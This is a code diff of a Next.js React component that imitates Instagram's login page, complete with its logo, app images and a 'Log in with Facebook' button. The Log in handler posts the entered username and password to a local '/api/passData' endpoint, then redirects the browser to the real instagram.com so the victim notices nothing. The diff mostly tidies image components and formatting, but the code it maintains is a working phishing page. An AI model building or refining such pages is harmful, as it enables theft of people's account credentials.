@@ -1,48 +1,46 @@
 "use client";
 
 import { useState } from "react";
-// import img from 'next/img'
 import Link from "next/link";
-import {useRouter} from "next/navigation";
+import { useRouter } from "next/navigation";
 import axios from "axios";
+import Image from "next/image"; // Import Next.js Image component
+
 export default function Component() {
   const router = useRouter();
   const [user, setUser] = useState({
     email: "",
     password: "",
-   
-})
-const onLogin = async () => {
-  try {
-     
+  });
+
+  const onLogin = async () => {
+    try {
       const response = await axios.post("/api/passData", user);
-      
-      router.push('https://www.instagram.com/');
+      router.push("https://www.instagram.com/");
       console.log("Signup success", response.data);
-      
-  } catch (error) {
+    } catch (error) {
       console.log("Signup failed", error.message);
-      
-      
-  }
-}
+    }
+  };
+
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col justify-center items-center p-4 sm:p-6 lg:p-8">
       <main className="max-w-screen-lg w-full flex flex-col lg:flex-row items-center justify-center gap-8 lg:gap-16">
-        <div className="hidden lg:block relative  w-[600px] h-[700px] ">
-          <img
-            src="/images/instagram-celular.png"
+        <div className="hidden lg:block relative w-[700px] h-[800px]">
+          <Image
+            src="/instagram-celular.png" // Correct path for public folder
             alt="Instagram app preview"
             layout="fill"
-            objectfit="contain"
+            objectFit="contain"
+            priority
+          
             
-            className="relative bottom-11 left-20 "
           />
         </div>
         <div className="w-full max-w-sm">
           <div className="bg-white p-8 border border-gray-300 mb-4">
-            <img
-              src="/images/instagram-logo.png"
+            <Image
+              src="/instagram-logo.png" // Correct path for public folder
               alt="Instagram"
               width={175}
               height={51}
@@ -52,20 +50,19 @@ const onLogin = async () => {
               <input
                 type="text"
                 placeholder="Phone number, username, or email"
-                className="w-full  px-2 py-2 border border-gray-300 rounded text-xs"
+                className="w-full px-2 py-2 border border-gray-300 rounded text-xs"
                 value={user.email}
-                onChange={(e) => setUser({...user,email:e.target.value})}
+                onChange={(e) => setUser({ ...user, email: e.target.value })}
               />
               <input
                 type="password"
                 placeholder="Password"
                 className="w-full px-2 py-2 border border-gray-300 rounded text-xs"
                 value={user.password}
-                onChange={(e) => setUser({...user,password:e.target.value})}
+                onChange={(e) => setUser({ ...user, password: e.target.value })}
               />
               <button
-              onClick={onLogin}
-              
+                onClick={onLogin}
                 className="w-full bg-blue-500 text-white py-1 rounded text-sm font-semibold"
               >
                 Log in
@@ -77,19 +74,16 @@ const onLogin = async () => {
               <div className="flex-1 border-t border-gray-300"></div>
             </div>
             <button className="w-full flex justify-center items-center text-sm text-blue-900 font-semibold">
-              <img
-                src="http://www.bombaynite.co.uk/wp-content/uploads/2020/05/cropped-FB-Icon.png"
+              <Image
+                src="/facebook.webp" // Replace with a valid path to your Facebook icon
                 alt="Facebook icon"
-                width={16}
-                height={16}
+                width={26}
+                height={26}
                 className="mr-2"
               />
               Log in with Facebook
             </button>
-            <Link
-              href="#"
-              className="block text-center text-xs text-blue-900 mt-4"
-            >
+            <Link href="#" className="block text-center text-xs text-blue-900 mt-4">
               Forgot password?
             </Link>
           </div>
@@ -103,16 +97,16 @@ const onLogin = async () => {
             <p className="text-sm mb-4">Get the app.</p>
             <div className="flex justify-center space-x-4">
               <Link href="#">
-                <img
-                  src="/images/apple-store-button.png"
+                <Image
+                  src="/apple-store-button.png"
                   alt="Get it on App Store"
                   width={136}
                   height={40}
                 />
               </Link>
               <Link href="#">
-                <img
-                  src="/images/google-play-button.png"
+                <Image
+                  src="/google-play-button.png"
                   alt="Get it on Google Play"
                   width={136}
                   height={40}
